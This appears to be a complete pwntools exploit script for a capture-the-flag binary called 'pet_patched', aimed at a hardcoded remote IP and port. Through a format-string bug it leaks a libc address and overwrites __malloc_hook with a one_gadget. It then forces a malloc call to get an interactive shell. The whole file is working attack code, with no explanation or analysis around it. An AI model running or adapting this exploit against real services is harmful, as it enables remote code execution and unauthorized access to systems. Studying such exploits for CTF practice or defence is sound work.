from pwn import *

context.binary = './pet_patched'
libc = ELF('./libc6_2.23-0ubuntu11.2_amd64.so')
elf = ELF('./pet_patched')
# p = process('./pet_patched')
p = remote('34.125.0.41', 9999)

def fmt(payload):
	p.recv()

	pl = b'fish'
	pl = pl.ljust(0x14, b'\x00')
	pl += bytes(payload)

	p.sendline(pl)

fmt(b'%p-'*5 + b'%6$n')
fmt(b' -%97$p-')

p.recvuntil(b' -')

libc_leak = int(p.recvuntil(b'-')[:-1], 16)

libc.address = libc_leak - libc.sym['__libc_start_main'] - 240
print(hex(libc.address))

malloc_hook = libc.sym['__malloc_hook']
one_gadget = libc.address + 0x4527a

pl = b'a'*4
pl += fmtstr_payload(47, {malloc_hook:one_gadget - 0x040404040404})

fmt(pl)
fmt(b'%70000c')

p.interactive()